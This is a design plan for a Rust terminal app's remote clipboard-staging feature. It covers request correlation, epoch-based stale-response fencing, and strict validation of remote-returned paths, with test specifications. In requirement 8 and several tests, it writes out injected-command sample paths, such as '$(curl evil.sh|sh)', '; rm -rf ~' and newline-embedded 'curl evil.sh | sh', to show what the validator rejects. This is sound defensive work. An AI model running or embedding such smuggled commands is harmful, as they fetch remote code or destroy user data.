# Phase 04 — client correlation, stale-response guard, path injection

## Context (verified against source)

### The precedent to mirror (and its gaps)

- `src/app/mod.rs:153-158` — `pending_remote_splits: HashMap<u64, creation::PendingRemoteSplit>` on
  **`App`**, not `AppState`. The new map is its sibling, for the same reason: resolution needs
  `runtime.try_send_paste`, and `AppState` must stay pure data testable without PTYs/async
  (predict section D).
- `src/app/creation.rs:1202-1220` — `struct PendingRemoteSplit`: stable `workspace_id: String` (not
  an index — indices shift), plus `origin: HostKey`. Copy both design choices.
- `src/app/creation.rs:795-802` `register_pending_remote_split`; `:804-806`
  `take_pending_remote_split` — `HashMap::remove` as the atomic claim; `:808-821`
  `purge_pending_remote_splits_for_workspaces`.
- `src/app/creation.rs:845-856` — the origin check on `handle_federation_split_pane_ready`;
  `:879-885` — the "workspace no longer exists" drop; `:950-999`
  `handle_federation_split_pane_failed`, including the exact `ToastNotification` construction at
  `:971-979` and the `ToastDelivery` match.
- `src/app/api.rs:172-186` — where `FederationSplitPaneReady`/`Failed` are dispatched from the
  `AppEvent` drain. The two new events go here.
- `src/app/api/workspaces.rs:369` (inside `handle_federation_mount_ended`, `:313`) and `:650`
  (inside `handle_workspace_close`, `:609`) — the **two existing** purge call sites. Do not invent a
  third.
- `src/app/api/workspaces.rs:674-684` — `federation_host_key_for_workspace`.
- `src/app/api/panes.rs:182-244` — `dispatch_remote_pane_split`: how a send site resolves the pane's
  live mount (`runtime.remote_terminal_id()` + `runtime.remote_out_tx()` at `:196-200`) and refuses
  when there is none. Same resolution shape for the stage request.
- `src/pane.rs:3072-3086` — `try_send_paste` → `paste_payload`: bracketing is applied **only when
  `input_state().bracketed_paste` is true** (`:3077-3084`); otherwise the string goes to the PTY raw,
  `\n` included. This is why the returned path must be rejected, not escaped.
  `src/terminal/runtime.rs:466-468` is the `TerminalRuntime` wrapper.
- `src/remote/federation/sanitize.rs:40-46` — `sanitize_remote_string`.
- `src/remote/federation/id.rs:198-207` — `fence()` is bare equality on
  `(host_key, server_instance_id, mount_generation)`. `mount_generation` is the constant `1`
  (`federation_accept.rs:66`, `serve.rs:44`) and `server_instance_id` is minted per remote *process*
  (`MountSnapshot`, `client.rs:190-206`), so neither distinguishes a fresh mount from a superseded
  one against the same running remote. The guard below therefore compares the locally minted
  per-mount `MountConnectionEpoch` (phase 03 step 7b) instead (A2).

## Requirements

1. `pending_remote_clipboard_stages: HashMap<u64, PendingClipboardStage>` on `App`
   (`app/mod.rs:158` neighbourhood), initialised at `app/mod.rs:820`'s neighbourhood.
2. `PendingClipboardStage { workspace_id: String, target_pane_id: PaneId, origin: HostKey,
   connection_epoch: MountConnectionEpoch, payload_len: usize, deadline: Instant }`.
   The epoch is the mount's locally minted per-connection value (phase 03 step 7b), read from the
   mirror at mint time. It replaces `server_instance_id`, which is per remote *process* and therefore
   identical across a remount to a still-running remote.
   `target_pane_id` is **resolved and stored at mint time** — never re-resolved from the focused
   pane at response time (predict P8: the user will have switched panes during a slow transfer).
3. **Payload-size-proportional timeout** (predict HIGH-3):
   `base + payload_len / assumed_min_throughput`. A fixed 10-15s tuned on loopback false-positives
   on a real 16 MiB paste over SSH. Constants live next to the struct with a comment deriving them.
   Timer starts when the request is handed to `out_tx`.
4. Timeout fires as a spawned `tokio::time::sleep` per request that then sends
   `AppEvent::FederationClipboardStageTimedOut { request_id, origin, connection_epoch }` — the
   variant phase 03 step 11 declares carries the epoch, so the construction site here **must** pass
   it; capture the pending entry's `connection_epoch` into the sleep task at mint time. The handler does
   `HashMap::remove` **first** as the atomic claim (matching `take_pending_remote_split`
   `creation.rs:805`), then toasts. A per-request sleep means cancelling one never affects another.
5. **In-flight cap of 2 per mount** (lowered from 4). `runtime.remote_out_tx()` is an
   `mpsc::unbounded_channel` (`client.rs:852`), so the in-flight cap is the *only* bound on client
   memory. Each in-flight stage pins roughly 16 MiB raw `Vec` + ~21 MiB base64 `String` + ~21 MiB
   encoded frame ≈ 58 MiB; at 4 that is ~230 MiB of client RSS on a slow link, and A1 already
   serialises them head-of-line, so a deeper queue buys nothing. Beyond the cap, reject locally with
   a toast; never queue.
6. Purge hooks at the **two existing teardown sites only** — `handle_federation_mount_ended` and
   `handle_workspace_close`. In `handle_federation_mount_ended` the existing
   `purge_pending_remote_splits_for_workspaces` call sits at `workspaces.rs:369`, **after two early
   `return`s** (the generation fence at `:320-333` and the "no workspaces to remove" arm at
   `:341-347`). The clipboard purge must run above the second early return, keyed by
   `origin: HostKey` — otherwise a mount dying on that path leaks its pending stages until timeout.
   **But it must run below an epoch fence, never above one.** The existing fence compares
   `mount_generation`, which is the constant `1` on both sides
   (`federation_accept.rs:66`, `serve.rs:44`), so a delayed `FederationMountEnded` from superseded
   connection A carries the same `HostKey` **and** the same generation as a fresh remount B and
   passes it — today that already lets a stale notice call `end_federation_mount` on a live mount,
   and an origin-wide purge hoisted to the top of the function would additionally destroy B's
   in-flight stage.
   Therefore, restructure `handle_federation_mount_ended` as:
   1. **first** compare the event's `connection_epoch` (phase 03 step 11a) with the live mirror's
      `connection_epoch()`; on mismatch log and `return` **without purging and without ending the
      mount** — this also closes the pre-existing stale-teardown hole for this event, locally, at the
      one site this feature depends on;
   2. keep the existing generation fence directly after it, unchanged;
   3. then the origin-keyed clipboard purge, above the "no workspaces to remove" early return;
   4. then the existing behavior.
   Give the purges distinct signatures:
   `purge_pending_remote_clipboard_stages_for_origin(&HostKey, MountConnectionEpoch)` for the
   mount-end site — it removes only entries whose stored epoch matches, so it can never reach a fresh
   remount's pending work — and `..._for_workspaces(&HashSet<String>)` for the workspace-close site.
7. **Ordered stale-response guard, in this order, before any injection.** The order matters and is
   copied from the shipped split-pane precedent (`creation.rs:845-861`), which deliberately does
   `get()` → origin check → `return` → only then `take_*`. `request_id` is a bare process-wide
   counter (`api/panes.rs:34-40`) and therefore guessable, so with more than one mount a
   remove-first design lets mount B evict mount A's pending entry with a forged/echoed
   `request_id` — the origin check then drops B, and A's legitimate response later finds no entry
   and is silently discarded. Do **not** invert this:
   1. `pending.get(request_id)` — peek only; absent → drop and log;
   2. response `origin` == `pending.origin`, else drop and log, **leaving the entry intact**;
   3. response `connection_epoch` == `pending.connection_epoch` — the A2 workaround; the locally
      minted per-mount value, the only one that distinguishes this mount from a superseded one
      against the same still-running remote;
   4. only now `pending.remove(request_id)` as the atomic claim;
   5. resolve the target pane from `pending.workspace_id` + `pending.target_pane_id`; if the
      workspace or pane is gone, drop with a toast.
   The timeout handler (requirement 4) keeps remove-first: it is locally originated, so there is no
   foreign claimant.
8. **Returned-path contract, reject-don't-strip**, applied after the guard and before
   `try_send_paste`. Control-byte rejection alone is **not sufficient**: `paste_payload`
   (`src/pane.rs:3076-3086`) sends the string raw whenever `input_state().bracketed_paste` is false,
   so a response such as `/tmp/herdr-clipboard-images-501/$(curl evil.sh|sh).png` or
   `/tmp/a; rm -rf ~/.png` contains no control byte, is absolute and non-empty, and would land
   verbatim on the agent's shell line. Ordered checks:
   1. the path is UTF-8 by construction (JSON codec);
   2. reject an empty path and a non-absolute path;
   3. run `sanitize::sanitize_remote_string`; **reject if sanitized != raw** — a legitimate path
      never contains a control byte;
   4. additionally reject `\n` / `\r` as a named, separately-tested guard even though (3) covers
      them (regression armour: this is the byte that means Enter);
   5. **the final path component must start with the `federation-clipboard-` prefix** minted by
      phase 02 step 8 — the client asked for a staged file, so only a staged file is an acceptable
      answer. Import the constant phase 02 exports (phase 02 requirement 9); do not retype the
      literal;
   6. **the whole string must match a conservative allowlist**: `[A-Za-z0-9._/@+-]` plus printable
      non-ASCII. This rejects space, `;`, `|`, `&`, `$`, backtick, `'`, `"`, `(`, `)`, `<`, `>`, `*`,
      `?`, `\`, `!`, `#`, `{`, `}`, `[`, `]`. **Consume the predicate phase 02 exports** (phase 02
      requirement 4b) rather than re-typing it here — a second copy is a drift hazard, and the remote
      now validates its own staging root against the same predicate *before* writing, so a
      well-behaved remote can no longer produce a path this step rejects;
   7. only then hand the unchanged string to the existing paste path.
   Note on step 1: "UTF-8 by construction" holds only because phase 02 now refuses to stage under a
   non-UTF-8 root and never uses `to_string_lossy`. Keep the check anyway — this is a hostile-remote
   boundary, not a same-tree invariant.
10. **Slow-transfer affordance lives here**, not in phase 05: it is a second `tokio::time::sleep`
   task minted by `begin_remote_clipboard_stage`, sibling to the timeout task, that raises the
   "saving image to remote host…" toast at ~1.5s only if the pending entry is still present. The
   constant and the toast copy constants all live in this phase's module, because this phase owns
   that file.
11. Injection reuses the existing local paste path unchanged: resolve the `TerminalRuntime` for
   `pending.target_pane_id` and `try_send_paste(path)`. No new PTY write path.
   **Delivery failure must be handled, not dropped.** `try_send_paste` returns
   `Result<(), mpsc::error::TrySendError<Bytes>>` (`src/terminal/runtime.rs:466`, `src/pane.rs:3072`);
   both `Full` and `Closed` are reachable. This is the one boundary where the remote side has already
   succeeded — the file exists on the remote host, and the pending entry has already been claimed and
   removed, so nothing downstream can retry or time it out. Discarding the `Err` therefore produces a
   *silent success*: a staged remote image whose path no agent ever learns, occupying quota until the
   sweep. Match the result and raise the failure toast on both arms (`image paste failed` /
   `pane was not ready to receive the path; paste again`, within the ~60-cell toast width limit), and
   `warn!` the pane id plus error kind — the remote artifact outlives the session, so the log is its
   only trace. Same failures-always-toast contract as the rest of the phase; the resolved pane simply
   cannot be assumed writable.

## Files

| Action | File | Owner |
|---|---|---|
| create | `src/app/remote_clipboard_stage.rs` (<200 LOC + tests) | phase 04 (exclusive) |
| modify | `src/app/mod.rs` | phase 04 (exclusive) — field, init, `mod` decl |
| modify | `src/app/api.rs` | phase 04 — the three new `ClipboardStage*` dispatch arms only. The `FederationMountEnded` destructure/forward was already updated by phase 03 (step 11a); do not re-touch it. |
| modify | `src/app/api/workspaces.rs` | phase 04 — handler **bodies** only: the `handle_federation_mount_ended` epoch fence (replacing phase 03's placeholder `debug!` on the new parameter) and the two purge calls. The variant's **construction** sites and the handler **signature** were already updated by phase 03 (step 11a); do not re-touch them. |
| — | `src/events.rs` | **phase 03 owns this file** and now adds all three variants (phase 03 step 11, already amended). Phase 04 does not touch it. |
| — | `src/app/actions.rs` | **phase 03 owns this file** (step 11b, the three exhaustive-match arms). Phase 04 does not touch it. |

`app/input/**` is phase 05. `src/remote/federation/**` is phase 03.

## Implementation steps

1. (No `events.rs` work here — phase 03 step 11 now lands all three variants and step 11b the
   matching `actions.rs` arms.)
2. New module `src/app/remote_clipboard_stage.rs`, `impl App` block, all `#[cfg(unix)]`:
   - `PendingClipboardStage` struct + timeout constants.
   - `begin_remote_clipboard_stage(&mut self, ws_idx, target_pane_id, image) -> Result<(),
     StageStartError>` — the mint site phase 05 calls. Resolves the live mount the way
     `dispatch_remote_pane_split` does (`api/panes.rs:190-200`), checks the in-flight cap, mints the
     `request_id`, calls phase 03's gated
     `client::send_clipboard_stage_request`, registers the pending entry, spawns the timeout task.
   - `take_pending_remote_clipboard_stage(request_id)` — `remove`, the atomic claim.
   - `purge_pending_remote_clipboard_stages_for_workspaces(&HashSet<String>)`.
   - `handle_federation_clipboard_stage_ready(...)` — the ordered guard (req. 7), the path contract
     (req. 8), then injection (req. 9).
   - `handle_federation_clipboard_stage_failed(...)` and `..._timed_out(...)` — claim then toast.
     Toast construction copies `creation.rs:971-979`'s `ToastDelivery` match verbatim.
   - **The toast copy constants for every `ClipboardStageFailure` variant** (the strings phase 05
     requirement 6 specifies) plus the failure→copy mapping function, and the ~1.5s slow-transfer
     task and its constant (requirement 10). Phase 05 references these; it does not define them,
     because it does not own this file. Phase 05's copy tests run against these constants.
   - `sanitize_returned_remote_path(&str) -> Result<&str, PathRejection>` — a free function so it is
     testable without an `App`.
3. `app/mod.rs`: `mod remote_clipboard_stage;`, the field next to `pending_remote_splits`
   (`:158`) with a doc comment matching that field's, and the `HashMap::new()` init next to
   `:820`.
4. `app/api.rs`: three dispatch arms after `:186`, same `#[cfg(unix)] if let … { …; return; }`
   shape as the existing federation arms. Each destructures `connection_epoch` and forwards it; the
   handlers cannot apply guard step 3 without it.
5. `app/api/workspaces.rs`: in `handle_workspace_close`, add the workspace-keyed purge as a sibling
   call to the existing `purge_pending_remote_splits_for_workspaces` call (anchor by that symbol, not
   by line number — the other edit shifts it). In `handle_federation_mount_ended`, add the epoch
   fence as the **first** statement and the origin+epoch-keyed purge **below both fences and above
   the "no workspaces to remove" early return**, per requirement 6. Phase 03 already added the event
   field, the construction sites, the `app/api.rs` forward and this function's `connection_epoch`
   parameter (with a placeholder `debug!` consuming it); this step replaces that placeholder with the
   fence. Signature unchanged here.

## Tests — TESTS FIRST

Starred (predict section F):

**Every rejection test in this phase must be driven through the real handler, not through the
sanitizer alone.** A test that calls `sanitize_returned_remote_path` and then asserts an empty pane
receiver proves nothing: the receiver is empty because no handler and no paste call ever ran, so an
implementation that calls `try_send_paste` *before* the sanitizer — the exact unbracketed-PTY hole
requirement 8 exists for — passes it. The shared fixture for tests 1, 2, 11 and 12 is therefore:

- register a `PendingClipboardStage` for a known `request_id`, workspace, pane, origin and epoch;
- insert a `TerminalRuntime::test_with_channel(cols, rows)` for that pane into
  `App::terminal_runtimes` (`src/terminal/runtime.rs:545`; the insertion pattern already exists at
  `src/app/api.rs:1449-1451`) and keep its `mpsc::Receiver<Bytes>`;
- drive a matching `AppEvent::FederationClipboardStageReady { request_id, remote_path, origin,
  connection_epoch }` through `App::handle_internal_event` (`app/api.rs:66`) — the production entry
  point, not the handler function directly;
- assert: the receiver is **empty**, no other runtime in the app received bytes either (no alternate
  injection path), and a failure toast was raised.
- **Positive control, in the same test module:** one `..._is_injected` case with an
  allowlist-clean, correctly prefixed path through the identical fixture must produce exactly that
  path on the receiver. Without it the "empty receiver" assertions remain unattributable.

Pure-function assertions on `sanitize_returned_remote_path` may accompany these, but never replace
them.

1. ★`returned_remote_path_with_embedded_newline_is_rejected_before_paste` — `"/tmp/x\n; curl
   evil.sh | sh\n"` driven through the fixture above; the pane runtime receives **nothing**.
2. ★`returned_remote_path_with_esc_sequence_is_rejected_before_paste` — a path containing `\x1b[2J`,
   same fixture, nothing written.
3. ★`clipboard_stage_request_times_out_when_remote_never_responds` — do **not** wait wall-clock; the
   repo has no paused-clock convention (`tokio::time::pause` / `start_paused` appear nowhere in
   `src/`) and requirement 3's base is 10-15s. Register a pending entry, then drive
   `AppEvent::FederationClipboardStageTimedOut` through `App::handle_internal_event` (`app/api.rs:66`)
   directly: assert the entry is gone, a toast was raised, and nothing was injected. The deadline
   arithmetic itself is test 4.
11. ★`returned_remote_path_with_shell_metacharacters_is_rejected_before_paste` — table over
    `"/tmp/herdr-clipboard-images-501/$(id).png"`, `"/tmp/a; rm -rf ~/.png"`,
    `"/tmp/x/federation-clipboard-1-0-a|b.png"`, `"/tmp/x/federation-clipboard-1-0-a b.png"`, each
    driven through the shared handler fixture → all rejected, nothing written to any runtime. This is
    the guard requirement 8 steps 5-6 exist for.
12. ★`returned_remote_path_without_the_staging_prefix_is_rejected` — `/etc/passwd` and
    `/tmp/herdr-clipboard-images-501/client-1-clipboard-9-0.png` (a *local*-scheme name), through the
    same handler fixture, are both rejected with nothing written. The pure-function assertion alone
    is not sufficient here for the same reason as tests 1/2/11.

12b. ★`staged_path_that_cannot_be_delivered_to_the_pane_reports_failure_instead_of_succeeding_silently`
    — the remote stage SUCCEEDED and the path is allowlist-clean and correctly prefixed, but delivery
    fails. Two arms: (a) a full channel via
    `TerminalRuntime::test_with_channel_capacity` (`src/terminal/runtime.rs:550`) pre-filled to
    capacity → `TrySendError::Full`; (b) a dropped receiver → `TrySendError::Closed`. Drive the
    matching `FederationClipboardStageReady` through the shared handler fixture and assert a failure
    toast was raised on each. Pairs with the fixture's existing positive control, which proves the
    same event on a healthy runtime does inject — otherwise "a toast appeared" cannot distinguish
    this failure from a rejection. This is the only test covering a path where the remote host holds
    a real file that the local side failed to use; without it, `try_send_paste`'s `Result` can be
    discarded and every other test in this phase still passes.

Non-starred (predict section F), same phase:

4. `clipboard_stage_timeout_is_proportional_to_payload_size_not_fixed` — assert the computed
   deadline for a 16 MiB payload is strictly greater than for a 64 KiB payload (test the pure
   deadline function, not wall-clock).
5. `clipboard_stage_pending_entries_purged_on_workspace_close_and_mount_end` — both call sites.
   Assert the entries exist **before** each teardown call, and include a control entry that must
   **survive** it (a different workspace for the close site; a different `connection_epoch` for the
   mount-end site). Without the survivor, a purge-everything implementation passes.
6. `clipboard_stage_response_from_a_restarted_remote_is_dropped_not_injected` — same `HostKey`,
   **different `connection_epoch`** (a restart necessarily produces a new mount, hence a new epoch);
   dropped at guard step 3, nothing injected. Uses the same handler fixture as tests 1/2/11/12 (real
   pending entry, real runtime, event through `handle_internal_event`) and **pairs with the positive
   control**: the identical event with the matching epoch injects. Assert additionally that the
   pending entry **survives** the dropped response, per guard steps 2-3 (peek, not remove).
6b. `clipboard_stage_response_after_a_remount_to_the_same_running_remote_is_dropped` — identical
   `HostKey`, and a remote whose `server_instance_id` is unchanged because the remote process never
   restarted; the drop must come from the **epoch** check at guard step 3. Assert explicitly that the
   two mounts' `server_instance_id`s are equal, so the test proves the epoch is doing the work and
   would fail if the guard regressed to comparing the instance id.
6c. `a_delayed_mount_ended_event_does_not_purge_or_end_a_fresh_remount` — mount A (epoch N), end it,
   remount B to the same host (epoch N+1) with a pending stage, **then** deliver A's delayed
   `FederationMountEnded`. Assert: B's mount is still live, B's pending entry is untouched, and B's
   response still injects. This is the requirement 6 fence; it fails today because `generation` is a
   constant on both sides.
7. `clipboard_stage_response_from_a_different_hostkey_is_rejected` — same handler fixture; assert the
   drop happens at guard step 2, the pending entry is **left intact** (so the legitimate response can
   still claim it later — deliver it afterwards in the same test and assert it injects), and nothing
   was written by the foreign response.
8. `two_pastes_in_quick_succession_resolve_independently_and_in_any_completion_order` — resolve the
   second `request_id` first; both inject into their own recorded target panes.
9. `a_third_concurrent_stage_request_is_rejected_locally_at_the_in_flight_cap` — the cap is **2**
   (requirement 5), so the **third** request is the first refusal; assert requests one and two each
   produced a `ClipboardStageRequest` on the mount's `out_tx` receiver and registered a pending
   entry, that the third produced a toast, **no** wire send and no new pending entry, and that after
   resolving one of the first two a further request is accepted again. Asserting only that a fifth
   request fails would also pass against the discarded cap of 4.
10b. `clipboard_stage_toast_copy_is_defined_for_every_failure_variant` — exhaustive `match` over
    `ClipboardStageFailure` (including the new `InvalidPayload` and `StagingUnavailable`) through the
    mapping function; every variant yields a non-empty title and context. The compile-time
    exhaustiveness is the real guard — a future variant must not fall into a catch-all.
10c. `a_slow_stage_raises_the_saving_toast_only_while_the_request_is_still_pending` — drive the
    ~1.5s affordance's pure predicate (pending present → toast; pending already claimed → no toast)
    without wall-clock waiting, mirroring test 3's approach to the timeout.
10. `remote_paste_injects_staged_path_through_local_paste_command` — asserts the path reaches the
    **pane recorded at mint time** even after focus moved to a different pane (the P8 assertion),
    using two `TerminalRuntime::test_with_channel` receivers: the mint-time pane's receives the path,
    the focused pane's stays empty.

**Runtime note:** `begin_remote_clipboard_stage` spawns `tokio::time::sleep` tasks (requirement 4 and
phase 05 step 2), and `tokio::spawn` panics outside a runtime. Any test that calls it — 3, 8, 9, 10 —
must be `#[tokio::test]`. Test 4 stays a plain `#[test]` against the pure deadline function.

## Risks and rollback

- **Risk:** the connection epoch is minted client-side, so it fences only what this client observes.
  That is sufficient here: every pending stage, its response event, and the mount-ended event all
  originate from the same client-side mount object, so the epoch is authoritative for all three. It
  deliberately does **not** fix federation-wide fencing (`SplitPaneResponse` still rides the
  degenerate `mount_generation`) — see plan.md A2 and Deferred.
- **Risk:** the epoch fence added to `handle_federation_mount_ended` changes existing behavior for
  the split-pane path too (a stale end-notice can no longer tear down a live mount). That is a
  strict improvement and is covered by test 6c, but it is a behavior change outside this feature's
  strict footprint — call it out at the ship gate.
- **Risk:** rejecting a path with any control byte could reject a legitimate exotic filename. It
  cannot in practice — phase 02 rejects such filenames at creation time, so a control byte in the
  response means the remote is lying.
- **Risk:** the timeout task holds a `Sender` and outlives a torn-down mount. Harmless: the handler
  claims by `remove`, so a timeout for an already-purged request is a logged no-op.
- **Rollback:** revert the new module + four small edits. Nothing outside `app/` depends on it until
  phase 05 wires the trigger.
